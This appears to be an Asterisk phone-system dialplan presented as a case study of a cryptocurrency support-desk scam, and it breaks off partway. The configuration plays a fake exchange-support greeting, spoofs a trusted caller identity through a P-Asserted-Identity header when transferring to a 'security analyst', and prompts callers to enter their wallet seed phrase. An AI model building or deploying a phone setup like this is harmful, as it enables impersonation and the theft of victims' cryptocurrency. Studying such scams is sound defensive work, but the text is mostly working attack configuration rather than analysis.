; GothFerrari Case Study - Support Desk IVR
; This dialplan mimics the professional greeting used to gain victim trust.

[support-desk-main]
exten => s,1,Answer()
 same => n,Playback(custom/welcome_to_exchange_support)
 same => n,Background(custom/press_1_for_security)
 same => n,WaitExten(5)

exten => 1,1,NoOp(Transferring to Security Analyst)
 same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:TRUSTED_NUMBER@sip24.cc>)
 same => n,Dial(PJSIP/operator_ext)

exten => 2,1,NoOp(Automated Seed Phrase Verification -  Setup)
 same => n,Playback(custom/please_enter_seed_phrase)
 ; ... (logic continues)
